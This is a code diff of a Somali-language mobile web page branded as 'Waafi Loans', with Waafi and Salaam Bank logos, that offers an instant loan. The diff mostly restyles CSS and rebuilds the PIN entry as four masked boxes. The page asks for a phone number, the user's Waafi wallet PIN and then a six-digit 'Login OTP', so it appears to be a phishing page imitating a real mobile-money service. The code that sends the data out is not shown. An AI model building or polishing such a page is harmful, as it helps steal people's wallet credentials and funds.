@@ -4,461 +4,203 @@
 <meta charset="utf-8"/>
 <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover"/>
 <meta name="theme-color" content="#7bbf2e"/>
-<title>Waafi Loans · Login</title>
-<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@300;400;500;600;700;800;900&family=DM+Mono:wght@400;500;700&display=swap" rel="stylesheet">
+<title>Waafi Loans · Gal</title>
+<link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700;800;900&family=DM+Mono:wght@400;500;700&display=swap" rel="stylesheet">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent}
-
 :root{
-  --green:#7bbf2e;
-  --green-2:#93cc3a;
-  --green-dark:#5a9020;
-  --green-light:#f2f9e6;
-  --green-mid:#e3f4c0;
-  --green-soft:#f8fdf0;
-  --text:#111827;
-  --text-2:#374151;
-  --text-3:#6b7280;
-  --text-4:#9ca3af;
-  --border:#e5e7eb;
-  --border-green:rgba(123,191,46,.28);
-  --white:#ffffff;
-  --font:'DM Sans',sans-serif;
-  --mono:'DM Mono',monospace;
-  --radius-md:14px;
-  --radius-lg:18px;
-  --radius-xl:26px;
+  --g:#7bbf2e;--gd:#5a9020;--gl:#f2f9e6;--gm:#e3f4c0;--gs:#f8fdf0;
+  --t:#111827;--t2:#374151;--t3:#6b7280;--t4:#9ca3af;
+  --b:#e5e7eb;--bg:rgba(123,191,46,.25);
+  --font:'DM Sans',sans-serif;--mono:'DM Mono',monospace;
+  --r:14px;--rl:18px;--rxl:26px;
 }
+html,body{width:100%;height:100%;height:100dvh;overflow:hidden;font-family:var(--font);background:var(--gs)}
+.screen{display:flex;flex-direction:column;width:100%;height:100%;max-width:430px;margin:0 auto;background:var(--gs);overflow:hidden;position:relative}
 
-html,body{
-  width:100%;height:100%;height:100dvh;
-  overflow:hidden;overflow-x:hidden;
-  font-family:var(--font);
-  background:#f8fdf0;
-}
+/* TOP WHITE BAR */
+.top-bar{background:#fff;padding:10px 18px 10px;flex-shrink:0;border-bottom:1px solid #e8f5d8;box-shadow:0 2px 6px rgba(0,0,0,.05)}
+.logos-row{display:flex;align-items:center;gap:10px;margin-bottom:6px}
+.logo-w{height:56px;object-fit:contain}
+.logo-s{height:42px;object-fit:contain}
+.logo-sep{width:1px;height:36px;background:#d1e8b0;flex-shrink:0}
+.bottom-row{display:flex;align-items:center;justify-content:space-between}
+.brand-name{font-size:13px;font-weight:800;color:var(--gd)}
+.chip{background:linear-gradient(135deg,#93cc3a,#5a9020);color:#fff;font-size:11px;font-weight:700;padding:5px 13px;border-radius:999px;box-shadow:0 2px 6px rgba(123,191,46,.3)}
 
-.screen{
-  display:flex;flex-direction:column;
-  width:100%;height:100%;height:100dvh;
-  max-width:430px;margin:0 auto;
-  background:#f8fdf0;
-  overflow:hidden;overflow-x:hidden;
-  position:relative;
-}
+/* GREEN HEADER */
+.header{background:linear-gradient(150deg,#93cc3a 0%,#7bbf2e 50%,#5a9020 100%);padding:14px 18px 18px;position:relative;overflow:hidden;flex-shrink:0}
+.header::after{content:'';position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,.07) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.07) 1px,transparent 1px);background-size:44px 44px;pointer-events:none}
+.ga{position:absolute;width:200px;height:200px;border-radius:50%;background:rgba(255,255,255,.12);filter:blur(45px);top:-80px;right:-50px;pointer-events:none}
+.gb{position:absolute;width:150px;height:150px;border-radius:50%;background:rgba(0,60,10,.18);filter:blur(35px);bottom:-40px;left:-20px;pointer-events:none}
+.hlabel{font-size:10px;color:rgba(255,255,255,.7);font-weight:700;text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px;position:relative;z-index:1}
+.hamount-row{display:flex;align-items:flex-end;gap:4px;margin-bottom:8px;position:relative;z-index:1}
+.hcur{font-size:14px;font-weight:700;color:rgba(255,255,255,.75);margin-bottom:2px}
+.hamt{font-size:36px;font-weight:800;color:#fff;line-height:1;font-family:var(--mono)}
+.hpills{display:flex;gap:6px;flex-wrap:wrap;position:relative;z-index:1}
+.hpill{background:rgba(255,255,255,.18);border:1px solid rgba(255,255,255,.28);border-radius:999px;padding:3px 10px;font-size:10px;font-weight:700;color:#fff;font-family:var(--mono)}
 
-/* ── WHITE LOGO BAR ── */
-.header-bar{
-  background:white;
-  padding:10px 20px 12px;
-  display:flex;flex-direction:column;gap:8px;
-  flex-shrink:0;
-  border-bottom:1px solid #e8f5d8;
-  box-shadow:0 2px 8px rgba(0,0,0,.06);
-  position:relative;z-index:2;
-}
-
-.brand-logos{display:flex;align-items:center;gap:10px}
-.brand-logo-waafi{height:84px;object-fit:contain;display:block}
-.brand-logo-salaam{height:63px;object-fit:contain;display:block}
-.brand-sep{width:1.5px;height:50px;background:#d1e8b0;flex-shrink:0}
-
-.brand-bottom{display:flex;align-items:center;justify-content:space-between}
-.brand-sub{font-size:13px;font-weight:800;color:var(--green-dark);letter-spacing:.2px}
-
-.header-chip{
-  background:linear-gradient(135deg,#93cc3a,#66a020);
-  border:none;padding:6px 14px;border-radius:999px;
-  font-size:11px;font-weight:700;color:white;
-  letter-spacing:.3px;flex-shrink:0;white-space:nowrap;
-  box-shadow:0 2px 8px rgba(123,191,46,.3);
-}
-
-/* ── GREEN HEADER ── */
-.header{
-  background:linear-gradient(160deg,#93cc3a 0%,#7bbf2e 45%,#5a9020 100%);
-  padding:16px 20px 20px;
-  position:relative;overflow:hidden;flex-shrink:0;
-}
-
-.header::after{
-  content:'';position:absolute;inset:0;
-  background-image:
-    linear-gradient(rgba(255,255,255,.07) 1px,transparent 1px),
-    linear-gradient(90deg,rgba(255,255,255,.07) 1px,transparent 1px);
-  background-size:44px 44px;pointer-events:none;
-}
-
-.hglow-a{
-  position:absolute;width:220px;height:220px;border-radius:50%;
-  background:rgba(255,255,255,.12);filter:blur(50px);
-  top:-90px;right:-60px;pointer-events:none;
-}
-.hglow-b{
-  position:absolute;width:160px;height:160px;border-radius:50%;
-  background:rgba(0,80,10,.18);filter:blur(40px);
-  bottom:-50px;left:-30px;pointer-events:none;
-}
-
-.header-info{position:relative;z-index:1}
-
-.header-label{
-  font-size:10px;color:rgba(255,255,255,.7);
-  font-weight:700;margin-bottom:4px;
-  text-transform:uppercase;letter-spacing:.5px;
-}
-
-.loan-amount-row{display:flex;align-items:flex-end;gap:5px;margin-bottom:10px}
-.loan-currency{font-size:15px;font-weight:700;color:rgba(255,255,255,.75);margin-bottom:3px}
-.loan-amount{
-  font-size:38px;font-weight:800;color:white;line-height:1;
-  font-family:var(--mono);font-variant-numeric:tabular-nums;
-}
-
-.loan-pills{display:flex;gap:6px;flex-wrap:wrap}
-.loan-pill{
-  background:rgba(255,255,255,.18);
-  border:1px solid rgba(255,255,255,.28);
-  border-radius:999px;padding:4px 10px;
-  font-size:10px;font-weight:700;color:white;
-  font-family:var(--mono);
-}
-.loan-pill-green{
-  background:rgba(255,255,255,.25);
-  border:1px solid rgba(255,255,255,.4);
-  border-radius:999px;padding:4px 10px;
-  font-size:10px;font-weight:800;color:white;
-  font-family:var(--mono);
-}
-
-/* ── BODY ── */
-.body{
-  flex:1;overflow-y:auto;overflow-x:hidden;
-  -webkit-overflow-scrolling:touch;
-  padding:16px 14px max(88px,calc(72px + env(safe-area-inset-bottom)));
-  overscroll-behavior:contain;min-height:0;
-}
+/* SCROLL BODY */
+.body{flex:1;overflow-y:auto;-webkit-overflow-scrolling:touch;padding:14px 14px max(84px,calc(68px + env(safe-area-inset-bottom)));min-height:0}
 .body::-webkit-scrollbar{display:none}
 
-/* STEP */
-.step{display:none;flex-direction:column}
-.step.active{display:flex}
+/* CARD */
+.card{background:#fff;border:1px solid var(--b);border-radius:var(--rl);overflow:hidden;margin-bottom:10px;box-shadow:0 2px 8px rgba(123,191,46,.08)}
+.cacc{height:3px;background:linear-gradient(90deg,#93cc3a,#7bbf2e,#a8d95a)}
+.ch{padding:12px 16px 10px;border-bottom:1px solid var(--b)}
+.ct{font-size:14px;font-weight:700;color:var(--t)}
+.cs{font-size:11px;color:var(--t3);margin-top:2px}
+.cb{padding:14px 16px}
 
-/* ── CARD ── */
-.card{
-  background:linear-gradient(160deg,#ffffff 0%,#f6fce8 100%);
-  border:1px solid var(--border);
-  border-radius:var(--radius-lg);overflow:hidden;margin-bottom:10px;
-  box-shadow:0 2px 10px rgba(123,191,46,.1);
-}
-.card-accent{height:3px;width:100%;background:linear-gradient(90deg,#93cc3a,#7bbf2e,#a8d95a)}
-.card-header{
-  padding:13px 16px 11px;
-  border-bottom:1px solid var(--border);
-  display:flex;align-items:center;justify-content:space-between;
-}
-.card-title{font-size:14px;font-weight:700;color:var(--text)}
-.card-sub{font-size:11px;color:var(--text-3);font-weight:500;margin-top:2px}
-.card-body{padding:14px 16px}
+/* LOGO IN CARD */
+.card-logo{display:flex;justify-content:center;padding:14px 0 4px}
+.card-logo img{height:56px;object-fit:contain}
 
 /* FIELD */
-.field{margin-bottom:14px}
-.field:last-child{margin-bottom:0}
-.field-label{
-  font-size:11px;font-weight:700;color:var(--text-2);
-  text-transform:uppercase;letter-spacing:.7px;margin-bottom:7px;
-}
+.f{margin-bottom:13px}
+.f:last-child{margin-bottom:0}
+.fl{font-size:11px;font-weight:700;color:var(--t2);text-transform:uppercase;letter-spacing:.6px;margin-bottom:6px}
 
 /* PHONE */
-.phone-row{display:flex;gap:8px}
-.phone-prefix{
-  background:var(--green-light);color:var(--green-dark);
-  font-size:13px;font-weight:800;font-family:var(--mono);
-  padding:0 12px;border-radius:var(--radius-md);
-  border:1.5px solid var(--border-green);
-  display:flex;align-items:center;flex-shrink:0;height:48px;
-}
+.prow{display:flex;gap:8px}
+.ppfx{background:var(--gl);color:var(--gd);font-size:13px;font-weight:800;font-family:var(--mono);padding:0 12px;border-radius:var(--r);border:1.5px solid var(--bg);height:48px;display:flex;align-items:center;flex-shrink:0}
+input[type=tel]{width:100%;height:48px;padding:0 13px;border-radius:var(--r);border:1.5px solid var(--b);background:var(--gs);font-family:var(--mono);font-size:16px;font-weight:600;color:var(--t);outline:none;-webkit-appearance:none}
+input[type=tel]:focus{border-color:var(--g);box-shadow:0 0 0 3px rgba(123,191,46,.12);background:#fff}
 
-input[type=tel]{
-  width:100%;height:48px;padding:0 14px;
-  border-radius:var(--radius-md);
-  border:1.5px solid var(--border);
-  background:var(--green-soft);
-  font-family:var(--mono);font-size:16px;font-weight:600;
-  color:var(--text);outline:none;
-  transition:border-color .18s,box-shadow .18s;-webkit-appearance:none;
-}
-input[type=tel]::placeholder{color:var(--text-4);font-family:var(--font);font-size:14px;font-weight:400}
-input[type=tel]:focus{
-  border-color:var(--green);
-  box-shadow:0 0 0 4px rgba(123,191,46,.12);
-  background:white;
-}
-
-.field-hint{font-size:11px;color:var(--text-4);font-weight:500;margin-top:5px}
-
-/* PIN — single hidden input + 4 visual boxes */
-.pin-wrap{display:flex;align-items:center;gap:10px}
-
-.pin-boxes-wrap{
-  position:relative;flex:1;height:56px;cursor:text;
-}
-
-.pin-real-input{
-  position:absolute;inset:0;
-  width:100%;height:100%;
-  opacity:0.01;z-index:2;
-  font-size:16px;border:none;outline:none;
-  background:none;caret-color:transparent;
-  color:transparent;
-}
-
-.pin-display{
-  display:flex;gap:8px;height:100%;
-  pointer-events:none;
-}
-
-.pin-box{
+/* PIN BOXES — 4 separate text inputs */
+.pin-row{display:flex;gap:9px;align-items:center}
+.pin-boxes{display:flex;gap:9px;flex:1}
+.pbox{
   flex:1;height:56px;border-radius:12px;
-  border:1.5px solid var(--border);
-  background:var(--green-soft);
-  display:flex;align-items:center;justify-content:center;
+  border:1.5px solid var(--b);background:var(--gs);
   font-family:var(--mono);font-size:22px;font-weight:800;
-  color:var(--text);
-  transition:border-color .18s,box-shadow .18s,background .18s;
+  color:var(--t);text-align:center;outline:none;
+  transition:border-color .15s,background .15s;
+  -webkit-appearance:none;padding:0;
+  /* mask by default via text-security */
+  -webkit-text-security:disc;
 }
-.pin-box.filled{background:white;border-color:var(--green)}
-.pin-box.active{border-color:var(--green);box-shadow:0 0 0 3px rgba(123,191,46,.15);background:white}
+.pbox:focus{border-color:var(--g);box-shadow:0 0 0 3px rgba(123,191,46,.12);background:#fff}
+.pbox.show{-webkit-text-security:none;font-size:22px}
 
-.eye-btn-outside{
-  background:var(--green-light);
-  border:1.5px solid var(--border-green);
-  border-radius:10px;
-  width:44px;height:56px;
-  display:flex;align-items:center;justify-content:center;
-  cursor:pointer;flex-shrink:0;
-  color:var(--green-dark);
-  transition:background .15s;
-}
-.eye-btn-outside:active{background:var(--green-mid)}
-  background:var(--green-light);
-  border:1.5px solid var(--border-green);
-  border-radius:10px;
-  width:44px;height:56px;
-  display:flex;align-items:center;justify-content:center;
-  cursor:pointer;flex-shrink:0;
-  color:var(--green-dark);
-  transition:background .15s;
-}
-.eye-btn-outside:active{background:var(--green-mid)}
+.eye-btn{width:46px;height:56px;border-radius:12px;border:1.5px solid var(--bg);background:var(--gl);display:flex;align-items:center;justify-content:center;cursor:pointer;flex-shrink:0;color:var(--gd)}
 
-/* POWERED BY */
-.powered{
-  text-align:center;padding:4px 0 2px;
-  font-size:10px;color:var(--text-4);font-weight:500;letter-spacing:.3px;
-}
-.powered strong{color:var(--text-3);font-weight:700}
+/* FOOTER */
+.footer{position:absolute;bottom:0;left:0;right:0;padding:10px 14px max(18px,env(safe-area-inset-bottom));background:linear-gradient(to top,var(--gs) 70%,transparent);z-index:10}
+.fbtn{width:100%;padding:15px;border:none;border-radius:var(--r);background:linear-gradient(135deg,#93cc3a,#7bbf2e,#5a9020);color:#fff;font-family:var(--font);font-size:15px;font-weight:800;cursor:pointer;opacity:.4;pointer-events:none;box-shadow:0 4px 14px rgba(123,191,46,.3)}
+.fbtn.on{opacity:1;pointer-events:auto}
 
-/* ── STICKY FOOTER ── */
-.sticky-footer{
-  position:absolute;bottom:0;left:0;right:0;
-  padding:12px 14px max(20px,env(safe-area-inset-bottom));
-  background:linear-gradient(to top,#f8fdf0 72%,transparent);z-index:10;
-}
+.pw{text-align:center;padding:4px 0;font-size:10px;color:var(--t4)}
+.pw strong{color:var(--t3)}
 
-.pay-btn{
-  background:linear-gradient(135deg,#93cc3a 0%,#7bbf2e 55%,#5a9020 100%);
-  color:white;border:none;width:100%;padding:16px;
-  border-radius:var(--radius-md);
-  font-family:var(--font);font-size:15px;font-weight:800;
-  cursor:pointer;letter-spacing:-.1px;transition:all .15s;
-  opacity:.4;pointer-events:none;
-  box-shadow:0 4px 18px rgba(123,191,46,.35);
-}
-.pay-btn.active{opacity:1;pointer-events:auto}
-.pay-btn:active{transform:scale(.98);filter:brightness(.92)}
+/* STEP */
+.step{display:none}.step.active{display:block}
 
-/* ── MODAL SHEETS ── */
-.modal-overlay{
-  position:absolute;inset:0;background:rgba(0,0,0,.4);
-  display:none;align-items:flex-end;justify-content:center;z-index:100;
-}
-.modal-overlay.open{display:flex}
+/* MODAL */
+.ov{position:absolute;inset:0;background:rgba(0,0,0,.4);display:none;align-items:flex-end;z-index:100}
+.ov.open{display:flex}
+.ms{background:#fff;width:100%;border-radius:var(--rxl) var(--rxl) 0 0;padding:0 0 28px;animation:up .2s ease;overflow:hidden}
+@keyframes up{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.mh{width:32px;height:4px;background:#e5e7eb;border-radius:2px;margin:10px auto 0}
+.mhdr{padding:14px 18px 12px;border-bottom:1px solid var(--b);display:flex;align-items:center;justify-content:space-between}
+.mt{font-size:16px;font-weight:800;color:var(--t)}
+.mx{width:26px;height:26px;border-radius:50%;background:#f3f4f6;border:none;font-size:12px;color:var(--t3);cursor:pointer;display:flex;align-items:center;justify-content:center}
+.mb{padding:14px 18px}
+.msub{font-size:10px;text-transform:uppercase;letter-spacing:.7px;font-weight:700;color:var(--t4);margin-bottom:10px}
 
-.modal-sheet{
-  background:white;width:100%;
-  border-radius:var(--radius-xl) var(--radius-xl) 0 0;
-  padding:0 0 32px;animation:slideUp .22s ease;overflow:hidden;
-}
-@keyframes slideUp{from{transform:translateY(100%);opacity:0}to{transform:translateY(0);opacity:1}}
+/* OTP in modal */
+.ow{position:relative;height:58px;margin-bottom:6px}
+.oh{position:absolute;inset:0;width:100%;height:100%;opacity:.01;z-index:2;font-size:16px;border:none;outline:none;background:none;caret-color:transparent;cursor:pointer}
+.od{display:flex;gap:7px;pointer-events:none;height:100%}
+.ob{flex:1;height:58px;border-radius:11px;border:1.5px solid var(--b);background:var(--gs);display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:22px;font-weight:800;color:var(--t);transition:border-color .15s,background .15s}
+.ob.f{background:#fff;border-color:var(--g)}
+.ob.a{border-color:var(--g);box-shadow:0 0 0 3px rgba(123,191,46,.12);background:#fff}
+.ob.d{opacity:.35;background:#f9fafb}
 
-.sheet-handle{width:36px;height:4px;background:#e5e7eb;border-radius:2px;margin:12px auto 0}
-
-.sheet-header{
-  padding:16px 20px 14px;border-bottom:1px solid var(--border);
-  display:flex;align-items:center;justify-content:space-between;
-}
-.sheet-title{font-size:17px;font-weight:800;color:var(--text)}
-.sheet-close{
-  width:28px;height:28px;border-radius:50%;background:#f3f4f6;
-  display:flex;align-items:center;justify-content:center;
-  font-size:13px;cursor:pointer;color:var(--text-3);border:none;
-}
-.sheet-body{padding:16px 20px}
-.sheet-sub{font-size:10px;text-transform:uppercase;letter-spacing:.7px;font-weight:700;color:var(--text-4);margin-bottom:10px}
-
-/* OTP boxes in sheet */
-.otp-wrap{position:relative;height:60px;margin-bottom:4px}
-.otp-wrap #otpHidden1,
-.otp-wrap #otpHidden2{
-  position:absolute;inset:0;width:100%;height:100%;
-  opacity:0;cursor:pointer;font-size:16px;z-index:2;
-  border:none;background:none;outline:none;caret-color:transparent;
-}
-.otp-display{display:flex;gap:8px;pointer-events:none}
-.otp-box{
-  flex:1;height:60px;border-radius:12px;
-  border:1.5px solid var(--border);
-  background:var(--green-soft);
-  display:flex;align-items:center;justify-content:center;
-  font-family:var(--mono);font-size:22px;font-weight:800;
-  color:var(--text);
-  transition:border-color .18s,box-shadow .18s,background .18s;
-}
-.otp-box.filled{background:white;border-color:var(--green)}
-.otp-box.active{border-color:var(--green);box-shadow:0 0 0 3px rgba(123,191,46,.15);background:white}
-.otp-box.disabled{opacity:.4;background:#f9fafb;border-color:var(--border)}
-
-/* Timer */
-.timer-row{display:flex;justify-content:space-between;align-items:center;padding:8px 0 0}
-.timer-label{font-size:12px;color:var(--text-4);font-weight:500}
-.timer-val{font-family:var(--mono);font-size:13px;font-weight:700;color:var(--green-dark)}
-.resend-btn{
-  background:none;border:none;font-family:var(--font);
-  font-size:12px;font-weight:700;color:var(--green);
-  cursor:pointer;opacity:.3;padding:0;transition:opacity .18s;
-}
-.resend-btn.active{opacity:1}
+.tr{display:flex;justify-content:space-between;align-items:center;margin-top:8px}
+.tl{font-size:12px;color:var(--t4)}.tv{font-family:var(--mono);font-size:12px;font-weight:700;color:var(--gd)}
+.rb{background:none;border:none;font-size:12px;font-weight:700;color:var(--g);opacity:.3;cursor:pointer}.rb.on{opacity:1}
 
 /* Summary rows */
-.sheet-rows{
-  background:#f9fafb;border-radius:var(--radius-md);
-  overflow:hidden;border:1px solid var(--border);margin-bottom:14px;
-}
-.sheet-row{
-  display:flex;justify-content:space-between;align-items:center;
-  padding:11px 14px;border-bottom:1px solid var(--border);
-}
-.sheet-row:last-child{border-bottom:none}
-.sheet-row-key{font-size:12px;color:var(--text-3);font-weight:500}
-.sheet-row-val{font-size:13px;font-weight:700;color:var(--text)}
-
-.sheet-total{
-  background:var(--green-light);border-radius:var(--radius-md);
-  padding:14px;display:flex;justify-content:space-between;align-items:center;
-  margin-bottom:18px;border:1px solid var(--border-green);
-}
-.sheet-total-label{font-size:13px;font-weight:700;color:var(--green-dark)}
-.sheet-total-val{font-size:22px;font-weight:800;color:var(--green);font-family:var(--mono)}
-
-.sheet-actions{display:flex;gap:10px}
-.btn-cancel{
-  flex:1;padding:14px;border-radius:var(--radius-md);
-  border:1.5px solid var(--border);background:transparent;
-  font-family:var(--font);font-size:14px;font-weight:700;
-  color:var(--text-3);cursor:pointer;
-}
-.btn-primary{
-  flex:2;padding:14px;border-radius:var(--radius-md);
-  border:none;
-  background:linear-gradient(135deg,#93cc3a,#7bbf2e,#5a9020);
-  font-family:var(--font);font-size:14px;font-weight:800;
-  color:white;cursor:pointer;
-  box-shadow:0 4px 12px rgba(123,191,46,.28);
-}
-.btn-primary:active{filter:brightness(.92);transform:scale(.98)}
+.srows{background:#f9fafb;border-radius:var(--r);overflow:hidden;border:1px solid var(--b);margin-bottom:12px}
+.sr{display:flex;justify-content:space-between;align-items:center;padding:10px 13px;border-bottom:1px solid var(--b)}
+.sr:last-child{border-bottom:none}
+.srk{font-size:12px;color:var(--t3);font-weight:500}
+.srv{font-size:13px;font-weight:700;color:var(--t)}
+.stot{background:var(--gl);border-radius:var(--r);padding:13px;display:flex;justify-content:space-between;align-items:center;margin-bottom:16px;border:1px solid var(--bg)}
+.stl{font-size:13px;font-weight:700;color:var(--gd)}
+.stv{font-size:20px;font-weight:800;color:var(--g);font-family:var(--mono)}
+.sact{display:flex;gap:9px}
+.sc{flex:1;padding:13px;border-radius:var(--r);border:1.5px solid var(--b);background:transparent;font-family:var(--font);font-size:14px;font-weight:700;color:var(--t3);cursor:pointer}
+.sp{flex:2;padding:13px;border-radius:var(--r);border:none;background:linear-gradient(135deg,#93cc3a,#7bbf2e,#5a9020);font-family:var(--font);font-size:14px;font-weight:800;color:#fff;cursor:pointer}
 </style>
 </head>
 <body>
-
 <div class="screen">
 
-  <!-- WHITE LOGO BAR -->
-  <div class="header-bar">
-    <div class="brand-logos">
-      <img src="assets/waafi.svg" alt="Waafi" class="brand-logo-waafi">
-      <div class="brand-sep"></div>
-      <img src="assets/salaamlogo.webp" alt="Salaam" class="brand-logo-salaam">
+  <!-- WHITE BAR -->
+  <div class="top-bar">
+    <div class="logos-row">
+      <img src="assets/waafi.svg" alt="Waafi" class="logo-w">
+      <div class="logo-sep"></div>
+      <img src="assets/salaamlogo.webp" alt="Salaam" class="logo-s">
     </div>
-    <div class="brand-bottom">
-      <div class="brand-sub">Waafi Loans</div>
-      <div class="header-chip">Amaah Degdeg ah</div>
+    <div class="bottom-row">
+      <span class="brand-name">Waafi Loans</span>
+      <span class="chip">Amaah Degdeg ah</span>
     </div>
   </div>
 
-  <!-- GREEN HEADER — loan summary -->
+  <!-- GREEN HEADER -->
   <div class="header">
-    <div class="hglow-a"></div><div class="hglow-b"></div>
-    <div class="header-info">
-      <div class="header-label">Xaddiga Amaahda</div>
-      <div class="loan-amount-row">
-        <span class="loan-currency">USD</span>
-        <span class="loan-amount" id="hAmount">0.00</span>
-      </div>
-      <div class="loan-pills">
-        <span class="loan-pill" id="hType">—</span>
-        <span class="loan-pill" id="hDur">—</span>
-        <span class="loan-pill-green" id="hMonthly">—/bil</span>
-      </div>
+    <div class="ga"></div><div class="gb"></div>
+    <div class="hlabel">Xaddiga Amaahda</div>
+    <div class="hamount-row">
+      <span class="hcur">USD</span>
+      <span class="hamt" id="hAmt">0.00</span>
+    </div>
+    <div class="hpills">
+      <span class="hpill" id="hType">—</span>
+      <span class="hpill" id="hDur">—</span>
+      <span class="hpill" id="hAge">—</span>
     </div>
   </div>
 
   <!-- BODY -->
   <div class="body">
-
-    <!-- STEP 1: Login -->
-    <div id="step1" class="step active">
+    <div class="step active" id="step1">
 
       <div class="card">
-        <div class="card-accent"></div>
-        <div style="padding:18px 16px 0;display:flex;justify-content:center">
-          <img src="assets/waafi.svg" alt="Waafi" style="height:84px;object-fit:contain;display:block">
+        <div class="cacc"></div>
+        <div class="card-logo">
+          <img src="assets/waafi.svg" alt="Waafi">
         </div>
-        <div class="card-header">
-          <div>
-            <div class="card-title">Xaqiiji Codsigaaga</div>
-            <div class="card-sub">Gali lambarka iyo PIN-kaaga Waafi</div>
-          </div>
+        <div class="ch">
+          <div class="ct">Xaqiiji Codsigaaga</div>
+          <div class="cs">Gali lambarka iyo PIN-kaaga Waafi</div>
         </div>
-        <div class="card-body">
+        <div class="cb">
 
-          <div class="field">
-            <div class="field-label">Lambarka Telefoonka</div>
-            <div class="phone-row">
-              <div class="phone-prefix">+252</div>
+          <div class="f">
+            <div class="fl">Lambarka Telefoonka</div>
+            <div class="prow">
+              <div class="ppfx">+252</div>
               <input type="tel" id="phone" inputmode="numeric" pattern="[0-9]*" placeholder="9XXXXXXXX">
             </div>
-            <div class="field-hint">Lambarka 9-nambar ee Waafi</div>
           </div>
 
-          <div class="field">
-            <div class="field-label" style="margin-bottom:7px">PIN-kaaga</div>
-            <div class="pin-wrap">
-              <div class="pin-boxes-wrap" id="pinWrap">
-                <input type="tel" id="pinHidden" maxlength="4"
-                  inputmode="numeric" pattern="[0-9]*" autocomplete="off"
-                  class="pin-real-input">
-                <div class="pin-display">
-                  <div class="pin-box" id="pb0"></div>
-                  <div class="pin-box" id="pb1"></div>
-                  <div class="pin-box" id="pb2"></div>
-                  <div class="pin-box" id="pb3"></div>
-                </div>
+          <div class="f">
+            <div class="fl">PIN-kaaga</div>
+            <div class="pin-row">
+              <div class="pin-boxes">
+                <input class="pbox" id="p0" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off">
+                <input class="pbox" id="p1" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off">
+                <input class="pbox" id="p2" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off">
+                <input class="pbox" id="p3" type="text" inputmode="numeric" maxlength="1" pattern="[0-9]" autocomplete="off">
               </div>
-              <button class="eye-btn-outside" id="eyeBtn" type="button">
-                <svg id="eyeIcon" width="20" height="20" viewBox="0 0 24 24" fill="none"
-                  stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
-                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/>
-                  <circle cx="12" cy="12" r="3"/>
+              <button class="eye-btn" id="eyeBtn" type="button">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                  <path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/>
                 </svg>
               </button>
             </div>
@@ -467,162 +209,149 @@ input[type=tel]:focus{
         </div>
       </div>
 
-      <div class="powered">Powered by <strong>Waafi</strong> &middot; <strong>Salaam Bank</strong></div>
+      <div class="pw">Powered by <strong>Waafi</strong> &middot; <strong>Salaam Bank</strong></div>
     </div>
 
-    <!-- STEP 4: Processing -->
-    <div id="step4" class="step">
-      <div class="card">
-        <div class="card-accent"></div>
-        <div class="card-body" style="padding:32px 16px;text-align:center">
-          <div style="width:60px;height:60px;border-radius:50%;background:var(--green-light);border:2px solid var(--border-green);display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:26px">✅</div>
-          <div style="font-size:18px;font-weight:800;color:var(--text);margin-bottom:6px">La gudbiyay!</div>
-          <div style="font-size:13px;color:var(--text-3);font-weight:500;line-height:1.6">Codsigaaga amaahda ayaa la diray.<br>Fadlan sug jawaab.</div>
-        </div>
+    <div class="step" id="step4">
+      <div class="card" style="text-align:center;padding:28px 16px">
+        <div style="font-size:40px;margin-bottom:10px">✅</div>
+        <div style="font-size:17px;font-weight:800;color:var(--t);margin-bottom:6px">La gudbiyay!</div>
+        <div style="font-size:13px;color:var(--t3);line-height:1.6">Codsigaaga amaahda ayaa la diray.</div>
       </div>
     </div>
-
   </div>
 
-  <!-- FOOTER -->
-  <div class="sticky-footer">
-    <button class="pay-btn" id="mainBtn">Xaqiiji Faahfaahinta</button>
+  <div class="footer">
+    <button class="fbtn" id="mainBtn">Xaqiiji Faahfaahinta →</button>
   </div>
 
-  <!-- ── OTP MODAL 1 (identity verify) ── -->
-  <div class="modal-overlay" id="otpModal1" onclick="handleOverlay('otpModal1',event)">
-    <div class="modal-sheet">
-      <div class="sheet-handle"></div>
-      <div class="sheet-header">
-        <div class="sheet-title">Xaqiijinta Aqoonsiga</div>
-        <button class="sheet-close" onclick="closeModal('otpModal1')">&#x2715;</button>
+  <!-- OTP 1: Login OTP -->
+  <div class="ov" id="m1" onclick="bgClose('m1',event)">
+    <div class="ms">
+      <div class="mh"></div>
+      <div class="mhdr">
+        <span class="mt">Login OTP</span>
+        <button class="mx" onclick="cm('m1')">✕</button>
       </div>
-      <div class="sheet-body">
-        <div class="sheet-sub">Gali OTP-ga 6-nambar ah</div>
-        <div class="otp-wrap" id="otpWrap1">
-          <input type="text" id="otpHidden1" inputmode="numeric" pattern="[0-9]*" maxlength="6" autocomplete="one-time-code">
-          <div class="otp-display" id="otp1Display">
-            <div class="otp-box" id="o1b0"></div><div class="otp-box" id="o1b1"></div>
-            <div class="otp-box" id="o1b2"></div><div class="otp-box" id="o1b3"></div>
-            <div class="otp-box" id="o1b4"></div><div class="otp-box" id="o1b5"></div>
+      <div class="mb">
+        <div class="msub">Gali Login OTP-ga 6-nambar ah</div>
+        <div class="ow" id="ow1">
+          <input type="tel" id="oh1" inputmode="numeric" maxlength="6" autocomplete="one-time-code" class="oh">
+          <div class="od">
+            <div class="ob" id="o1b0"></div><div class="ob" id="o1b1"></div>
+            <div class="ob" id="o1b2"></div><div class="ob" id="o1b3"></div>
+            <div class="ob" id="o1b4"></div><div class="ob" id="o1b5"></div>
           </div>
         </div>
-        <div class="timer-row">
-          <div class="timer-label">Waxay dhacaysaa <span class="timer-val" id="time1">120</span>s</div>
-          <button class="resend-btn" id="resend1">Dib u dir</button>
